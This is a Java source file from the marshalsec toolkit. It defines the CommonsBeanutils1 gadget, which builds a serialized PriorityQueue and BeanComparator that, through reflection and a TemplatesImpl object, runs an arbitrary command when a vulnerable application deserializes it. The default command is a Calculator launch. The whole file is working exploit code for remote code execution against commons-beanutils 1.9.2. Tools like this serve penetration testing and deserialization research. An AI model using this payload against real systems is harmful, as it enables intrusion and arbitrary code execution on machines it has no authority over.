package marshalsec.gadgets;

import java.math.BigInteger;
import java.util.PriorityQueue;
import marshalsec.UtilFactory;
import marshalsec.util.Gadgets;
import marshalsec.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;

/**
 * commons-beanutils:commons-beanutils:1.9.2
 */
public interface CommonsBeanutils1 extends Gadget {

	@Args(minArgs = 1, args = {
			"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
	default Object makeCommonsBeanutils1(UtilFactory uf, String[] args) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(args[0]);
		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}

}
